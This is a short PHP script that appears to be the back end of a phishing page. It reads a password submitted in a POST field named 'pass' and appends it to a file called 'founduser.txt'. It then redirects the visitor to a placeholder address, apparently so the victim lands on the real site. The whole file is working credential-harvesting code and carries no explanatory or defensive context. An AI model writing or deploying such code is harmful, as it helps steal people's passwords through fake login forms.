<?php
 $user = $_POST["pass"];
 $co = "===========================================\n"; 
 $cl = "===========================================\n";
 $fileuser = fopen("founduser.txt", "a") or die("Intentalo nuevamente");
 $us = "Password: $user\n";
 fwrite($fileuser, "\n". $co. $us. $cl);
 fclose($fileuser);
 header('Location: {}');
 exit();
?>
